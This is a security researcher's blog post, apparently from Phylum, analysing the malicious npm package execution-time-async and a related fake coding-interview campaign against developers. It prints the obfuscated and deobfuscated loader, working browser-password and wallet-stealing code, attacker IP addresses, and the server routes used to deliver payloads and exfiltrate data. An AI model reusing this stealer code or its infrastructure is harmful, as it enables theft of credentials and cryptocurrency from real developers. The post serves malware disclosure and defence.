@@ -1,0 +1,419 @@
+
+Phylum continues to discover malware polluting open-source ecosystems. In this blog post, we take a deep-dive into an npm package trying to masquerade as code profiler which actually installs several malicious scripts including a cryptocurrency and credential stealer.  Curiously, the attacker attempted to hide the malicious code in a test file, presumably thinking that no one would bother to look for malware in test code.  Along the way, we point out critical mistakes made by the attacker that helped to link this package to some suspect repositories on GitHub that Phylum is continuing to investigate.
+npm
+npm.mave.finance
+
+
+Spoofing a legitimate package
+On 5 Feb 2024, an npm user named nino1234 published execution-time-async version 1.4.1.  A cursory inspection of the code shows the similarity between this package and execution-time version 1.4.1 which is a “node.js utility to measure execution time in code” and which has over 27K weekly downloads. (As an aside, Phylum has observed a noticeable uptick in the use of this tactic — adding plausible sounding words to malicious package names, also known as combosquatting — as the popularity of typosquatting wanes.) But, lurking in a seemingly innocuous test file lies an attack against the unsuspecting developer.
+The trojanized code in execution-time-async begins in index.js, the entry point specified in package.json by requiring a putative test file similarly named to the legitimate test file ./test/index-text.js in execution-time.
+"use strict";
+
+const prettyHrtime = require('pretty-hrtime');
+const getConfigs = require('./test/index-config-text');
+
+const namedPerformances = {};
+const defaultName = 'default';
+
+const performance = (logInstance) => {
+  return {
+    start: (name) => {
+      name = name || defaultName;
+      namedPerformances[name] = {
+        startAt: process.hrtime(),
+      }
+    },
+    config: () => {
+      getConfigs();
+    },
+    stop: (name) => {
+      name = name || defaultName;
+...
+index.js in the malicious package execution-time-async on npm
+When getConfigs() is called later, ./test/index-config-text.js executes its contents. The code in that file is over 450 lines of obfuscated code, starting with this:
+Object.prototype.toString,
+  Object.defineProperty,
+  Object.getOwnPropertyDescriptor;
+const t = "base64",
+  c = "utf8",
+  r = (r) => ((s1 = r.slice(1)), Buffer.from(s1, t).toString(c)),
+  e = (r, e) => {
+    let E = Buffer.from(r, t);
+    const s = E.length;
+    let F = 0,
+      a = new Uint8Array(s);
+    for (ii = 0; ii < s; ii++) {
+      F = 3 & ii;
+      let t = e[o](F);
+      a[ii] = 255 & (E[ii] ^ t);
+    }
+    return ((t, c) => Buffer.from(t).toString(c))(a, c);
+  },
+  E = (t) => e(t, c),
+  o = r("2Y2hhckNvZGVBdA"),
+  s = E("BgUKUQERVQ"),
+  a = E("FgYfSAEb"),
+  i = "request",
+  $ = E("BRgHTBMbFFU"),
+  n = E("ARkWXBwG"),
+  l = E("HRsLXREdFA"),
+  R = E("HRsVTBsVC10"),
+  W = E("AQ0WXQ"),
+  V = require("os"),
+  U = require("path"),
+  Q = require(s),
+  g = require(a),
+  h = require(i),
+  w = require("child_process")["exec"],
+  x = V[R](),
+  f = V[$](),
+  y = V[l](),
+  I = V[n](),
+  G = V[W](),
+  S = require("fs");
+...
+First lines of code in ./test/index-config-text.js in execution-time-async
+At face value, this already looks shady - a string "request" and another requiring ["child_process"]["exec"] suggests reaching out to a remote source for some file to be immediately executed.  Moreover, the obscured strings in proximity to string manipulating functions is always indicative of hiding something, and usually with sinister intent.  As with all obfuscated code, the deobfuscation routines are packaged with the code, and so this one unwinds to produce
+Object.prototype.toString,
+  Object.defineProperty,
+  Object.getOwnPropertyDescriptor;
+const os = require("os"),
+  path = require("path"),
+  sqlite3 = require("sqlite3"),
+  crypto = require("crypto"),
+  request = require("request"),
+  exec = require("child_process")["exec"],
+  hostname = os.hostname(),
+  platform = os.platform(),
+  homedir = os.homedir(),
+  tmpdir = os.tmpdir(),
+  osType = os.type(),
+  fs = require("fs");
+...
+Same code as above, but deobfuscated
+Later, a snippet of the deobfuscated code reveals some of its intent, namely to steal the victim’s login credentials and passwords from a variety of browsers:
+const K = "/AppData/Local/Microsoft/Edge/User Data",
+  P = (t, c) => {
+    result = "";
+    try {
+      const r = `${t}`,
+        e = require(`${homedir}/store.node`);
+      if (osType != "Windows_NT") return;
+      const E = "SELECT * FROM logins",
+        s = `${H("~/")}${c}`;
+      let F = path.join(s, "Local State");
+      fs.readFile(F, "utf-8", (t, c) => {
+        if (!t) {
+          (mkey = JSON.parse(c)),
+            (mkey = mkey.os_crypt.encrypted_key),
+            (mkey = ((t) => {
+              var c = atob(t),
+                r = new Uint8Array(c.length);
+              for (let t = 0; t < c.length; t++) r[t] = c.charCodeAt(t);
+              return r;
+            })(mkey));
+          try {
+            const t = e.CryptUnprotectData(mkey.slice(5));
+            for (ii = 0; ii <= 200; ii++) {
+              const c = 0 === ii ? "Default" : `Profile ${ii}`,
+                e = `${s}/${c}/Login Data`,
+                o = `${s}/t${c}`;
+              if (!j(e)) continue;
+              const F = `${r}_${ii}_Profile`;
+              fs.copyFile(e, o, (c) => {
+                try {
+                  const c = new sqlite3.Database(o);
+                  c.all(E, (r, e) => {
+                    var E = "";
+                    r ||
+                      e.forEach((c) => {
+                        var r = c.origin_url,
+                          e = c.username_value,
+                          o = c.password_value;
+                        try {
+                          "v" === o.subarray(0, 1).toString() &&
+                            ((iv = o.subarray(3, 15)),
+                            (cip = o.subarray(15, o.length - 16)),
+                            cip.length &&
+                              ((mmm = crypto.createDecipheriv("aes-256-gcm", t, iv).update(cip)),
+                              (E = `${E}W:${r} U: ${e} P:${mmm.toString(
+                                "latin1"
+                              )}\n\n`)));
+                        } catch (t) {}
+                      }),
+                      c.close(),
+                      fs.unlink(o, (t) => {}),
+                      Ut(F, E);
+                  });
+                } catch (t) {}
+              });
+            }
+          } catch (t) {}
+        }
+      });
+    } catch (t) {}
+  },
+  ot = [
+    [
+      "/Library/Application Support/Google/Chrome",
+      "/.config/google-chrome",
+      "/AppData/Local/Google/Chrome/User Data",
+    ],
+    [
+      "/Library/Application Support/BraveSoftware/Brave-Browser",
+      "/.config/BraveSoftware/Brave-Browser",
+      "/AppData/Local/BraveSoftware/Brave-Browser/User Data",
+    ],
+    [
+      "/Library/Application Support/com.operasoftware.Opera",
+      "/.config/opera",
+      "/AppData/Roaming/Opera Software/Opera Stable/User Data"
+    ],
+  ],
+  st = "Local Extension Settings", //Local Extension Settings
+  Bt = "solana_id.txt";
+Stealer supports multiiple browsers
+Python scripts
+After stealing browser passwords, extension data from cryptocurrency extensions, and ~/.config/solana/id.json, a Python script is downloaded from a hardcoded IP address and launched which triggered several other downloads.
+const d = (t) => e(t, c),
+  X = "http://162.218.114.83:3000",
+  C = d("ER0UVhQZAw"),
+...
+Hardcoded server IP address and port that serves malicious Python scripts
+Phylum grabbed copies of these script while the server was up and found that a copy of Python is included in case the victim only does Javascript development.  Some highlights from these scripts:
+~/.npl
+This script bootstraps the target environment for the next script. It ensures requests is installed, downloads ~/.n2/pay and ~/.n2/bow, and launches them. ~/.n2/bow is skipped at this time if running on Mac OS.
+~/.n2/pay
+This script connects to the same host but using TCP sockets to port 3001 instead of HTTP to port 3000. It allows the attacker to remotely control the victim’s computer using a simple JSON protocol with binary length prefixes.
+Features include:
+
+Run arbitrary commands
+Delete itself (only this script file and not any of the other files that came with it)
+Download and launch ~/.n2/bow
+Upload arbitrary files and directories to FTP
+Terminate Chrome and Brave
+Download and launch ~/.n2/adc
+Return the locations of directories that might be useful for other commands
+There is also commented out code for stealing the user’s clipboard.
+~/.n2/bow
+This script is just another browser secret stealer, but this time in Python.
+~/.n2/adc
+This script installs and configures AnyDesk on Windows, or at least it would if the file weren’t missing from the server. Even though this is a Python script and Python is perfectly capable of editing text files, it generates and executes a PowerShell script to update the AnyDesk config. The credentials are hardcoded, and the connection information is sent to /keys.
+Version 1.4.2
+As a final observation about execution-time-async, the difference between the original version 1.4.1 and the update to version 1.4.2 on 13 Feb 2024 is slight.  In ./test/index-config-text.js the author changes the hardcoded IP address and port for the socket that the server is listening for the malware to reach out to:
+--- 
+
++++ 
+
+@@ -49,11 +49,11 @@
+
+ });*/
+ 
+ let u;
+ 
+ const d = (t) => e(t, c),
+-  X = "http://162.218.114.83:3000",
++  X = "http://45.61.169.99:3000",
+   C = d("ER0UVhQZAw"),
+   H = (t) =>
+     t.replace(/^~([a-z]+|\/)/, (t, c) => ("/" === c ? y : `${U[C](y)}/${c}`)),
+   Y = "slJCNQ5",
+   D = "AgYPTBAyD1QQJx9WFg",
+Changing the server IP address
+Initially, we did not think that this amounted to anything spectacular.  That is, until we began to investigate who might be behind this attack.
+Identifying the author
+As we were analyzing the obfuscated code, we ran across some inline comments that suggested a lead on attributing who might be behind this attack.
+...    
+		for (let r = 0; r < 200; r++) {
+      const o = `${t}/${0 === r ? v : `${O} ${r}`}/${st}`; //Profile 1/Local Extension Settings
+
+      // /Users/ninoacuna/Library/Application Support/Google/Chrome/Profile 158/Local Extension Settings
+      for (let t = 0; t < At.length; t++) {
+...
+					const t = d(b),
+            c = "writeFileSync",
+            r = "get",
+            e = `${X}${t}`,
+            E = `${y}${M}`; // /Users/ninoacuna/.npl
+          // console.log('e', e);
+          let o = `${Vt}3 "${E}"`; //python3 "/Users/ninoacuna/.npl"
+          // console.log('e---',E )
+...
+/Users/ninoacuna/.npl in the inline comments
+It isn’t clear why these comments were left in the code, and it seemed unlikely to actually tie anything together, but we searched GitHub for Nino Acuna and found a user who goes by binaryExDev
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240216at14.37.43.png
+binaryExDev
+Besides the possible typos in some of the package names, the recent File-Uploader package caught our attention.  The README for that package is a title only, so that doesn’t help to figure out what this package is up to.  With a name like File-Uploader we expected to find server and client code to move files across a network, and we did.  Looking through the commit history, we first noticed that all 53 commits to that repo were authored and committed by Nino Acuna.  And then we stumbled onto this diff from commit cd0cd89 on 12 Feb 2024:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240216at14.54.20.png
+File-Uploader
+execution-time-async
+The day before the npm package execution-time-async updated the server IP addresses in version 1.4.2, this File-Uploader repository changed its host IP addresses to the exact same IP and port.  Moreover, it’s not just the IP addresses that match. The routes in src/routes/web.js align with the requests made by the malicious index-config-text.js to /client /pdown /uploads /keys.
+let routes = app => {
+  router.get("/", homeController.getHome);
+  // client
+  router.get("/client", clientController.getClient);
+  // payload
+  router.get("/payload", clientController.getPayload);
+  // brow
+  router.get("/brow", clientController.getBrow);
+  //adc
+  router.get("/adc", clientController.getAdc);
+  router.get("/pdown", clientController.getP)
+  
+  router.post("/multiple-upload", uploadController.multipleUpload);
+  router.post("/uploads", upload.array('multi_file'), uploadController.dataUpload);
+  router.post("/keys", keyController.keyUpload);
+  
+
+  return app.use("/", router);
+};
+
+/client is used by index-config-text.js to download a Python second stage that gets saved as ~/.npl.
+/payload is used by ~/.npl to download another Python script ~/.n2/pay.
+/brow is used by both ~/.npl and ~/.pay to download another Python script ~/.n2/bow.
+/adc is used by ~/.n2/pay to download another Python script ~/.n2/adc.
+/pdown is used by index-config-text.js to download a copy of Python 3.11 for Windows into ~/.pyp in case the victim doesn’t already have one.
+/multiple-upload doesn’t seem to be used.
+/uploads is used by index-config-text.js to exfiltrate stolen data related to crypto currency.
+/keys is used by index-config-text.js and ~/.n2/adc and ~/.n2/bow and ~/.n2/pay to exfiltrate credentials.
+At this moment, the server implementation in File-Uploader is unfinished, but we suspect that this attack is a work in progress.  While drafting this blog, Phylum’s automated system alerted us to other, similar packages named data-time-utils and login-time-utils were published to npm by a user named niacuna02. And, moments ago, the user ntekyz on npm published mongodb-connection-utils and mongodb-execution-utils which are nearly identical to the packages in this post.  Phylum immediately reported these as malware, and we continue to actively monitoring this situation.
+Following the followers
+As a final observation, we looked into two accounts that binaryExDev follows and found mave-finance-org which contains two trojanized template repositories - auth-playground and nextjs-playground.  The first package lists mongodb-execution-utils as a dependency (up until a moments ago the dependency was execution-time-async) so that the malicious code doesn’t have to be present in the package itself.
+Update 1: 21 Feb 2024 - Further investigation into mave-finance-org/auth-playground revealed that over a dozen developers forked this repository - which alone is nothing unusual or nefarious.  However, some of these forks are renamed things like auth-demo or auth-challenge indicating that perhaps these developers were led to believe that this repo was part of a coding challenge, or even a job interview.  At the moment there are six pull requests which offer putative improvements to the code base, but these have all been summarily closed without comment. If the motive is to deliver the cryptocurrency and credential stealing malware to the developer (now in the mongodb-execution-utils dependency), then it is a fait accompli and the pull requests will likely never be merged.
+
+Update 2: 21 Feb 2024 - Several changes in tactics throughout today.  First, the GitHub repository has moved to banus-finance-org/auth-sandbox. Second, the malicious obfuscated code has been copied directly into the repo, and this obviates the need for the dependency on an npm package to hold the malicious code.  Thus, the third change has been to eliminate the dependency from the package.json dependency list.  We presume that npm package take downs necessitated this shift.
+We continued pursuing this under the assumption that the targets for this activity are job-seeking software developers, and to this end we found this job posting:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240221at15.11.00.png
+It is not at all clear at this time whether Banus Finance is a legitimate company that a bad actor is masquerading as or if it is an elaborate social engineering scheme.  Either way, this actor seems determined to continue attacking software developers in order to steal their cryptocurrency and other credentials.  Developers should remain vigilant to carefully vet any source code that strangers on the Internet insist that you download.
+Update 3: 22 Feb 2024 - Up until recently, this actor has tried to use npm to host the malicious dependency, which as of this update is mongodb-execution-utils. However, their efforts have thwarted by repeated take downs of their malicious packages, and so they appear to have taken to hosting their own.  In an .npmrc file, they have added a registry hxxp://npm.mave.finance (a callback to the first fake company from where they were previously operating):
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240222at15.19.42.png
+npm
+(As an aside, observe also that the GitHub repository has moved to Dexbanus-org/live-coding-sandbox, again because of GitHub's vigilance to take down these malicious repositories.)
+Adding a registry has the effect that when the package installation looks to install all the dependencies listed in package.json on npmjs.org, mongodb-execution-utils will not be found. So, it will then turn to the registry in .npmrc where mongodb-execution-utils is hosted and will dutifully install the malicious package.  This new evasive tactic effectively takes away any oversight or control that the npm security team may have had, and it should be viewed as a escalation in the threat this attack poses.
+The Phylum research team also received word from Palo Alto Network's Unit 42 that the malicious, obfuscated JavaScript on which this blog post is based coincided with BeaverTail from their own independent research into an ongoing North Korean job-seeking campaign against software developers.
+Moreover, some software developers who were taken in by these actors have contacted Phylum to thank us for raising awareness of this attack and preventing them from becoming a victim:
+Update 4: 23 Feb 2024 -  The attackers now host the attack from mave-finance/next-assessment.  The malicious dependency is json-mock-config-server which is not listed in the npm registry, but rather is served from npm.mave.finance as before, the registry listed in .npmrc.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240223at17.34.03.png
+package.json
+The developer name has changed to Luis Caneiro, and the README.md is more polished to better disguise the malicious intent as a coding interview:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240223at17.37.47.png
+README.md
+Again, as before, the malicious code hidden in the dependency json-mock-config-server gets called innocuously, but this time in the file ./pages/api/ballots
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_928078\Screenshot20240223at17.40.58.png
+mockJsonConfig()
+Overall, the code is cleaner, stripped down to only the essentials to provide a plausible coding interview, and much less likely to be suspected by a prospective job-seeker.
+Conclusion
+Phylum continues to investigate this File-Uploader GitHub repository and connections to other GitHub repositories and users such as mave-finance-org.  It is not yet clear whether this is the work of a single actor or a group of actors. Based on independent, corroborating research, it now appears that this is the work of state-sponsored North Korean activity. More than ever, it is important for both individual developers as well as software development organizations to remain vigilant against these attacks in open-source code.
+npm
+npm
+nino1234
+execution-time-async
+execution-time
+execution-time-async
+index.js
+package.json
+./test/index-text.js
+execution-time
+index.js
+execution-time-async
+npm
+getConfigs()
+./test/index-config-text.js
+./test/index-config-text.js
+execution-time-async
+"request"
+["child_process"]["exec"]
+~/.config/solana/id.json
+~/.npl
+requests
+~/.n2/pay
+~/.n2/bow
+~/.n2/bow
+~/.n2/pay
+~/.n2/bow
+~/.n2/adc
+~/.n2/bow
+~/.n2/adc
+/keys
+execution-time-async
+./test/index-config-text.js
+/Users/ninoacuna/.npl
+binaryExDev
+File-Uploader
+File-Uploader
+cd0cd89
+execution-time-async
+File-Uploader
+src/routes/web.js
+index-config-text.js
+/client
+/pdown
+/uploads
+/keys
+/client
+index-config-text.js
+~/.npl
+/payload
+~/.npl
+~/.n2/pay
+/brow
+~/.npl
+~/.pay
+~/.n2/bow
+/adc
+~/.n2/pay
+~/.n2/adc
+/pdown
+index-config-text.js
+~/.pyp
+/multiple-upload
+/uploads
+index-config-text.js
+/keys
+index-config-text.js
+~/.n2/adc
+~/.n2/bow
+~/.n2/pay
+File-Uploader
+data-time-utils
+login-time-utils
+npm
+niacuna02
+ntekyz
+npm
+mongodb-connection-utils
+mongodb-execution-utils
+binaryExDev
+mave-finance-org
+auth-playground
+nextjs-playground
+mongodb-execution-utils
+execution-time-async
+mave-finance-org/auth-playground
+auth-demo
+auth-challenge
+mongodb-execution-utils
+banus-finance-org/auth-sandbox
+npm
+package.json
+npm
+npm
+mongodb-execution-utils
+.npmrc
+hxxp://npm.mave.finance
+Dexbanus-org/live-coding-sandbox
+package.json
+npmjs.org
+mongodb-execution-utils
+.npmrc
+mongodb-execution-utils
+npm
+mave-finance/next-assessment
+json-mock-config-server
+npm.mave.finance
+.npmrc
+README.md
+json-mock-config-server
+./pages/api/ballots
+File-Uploader
+mave-finance-org
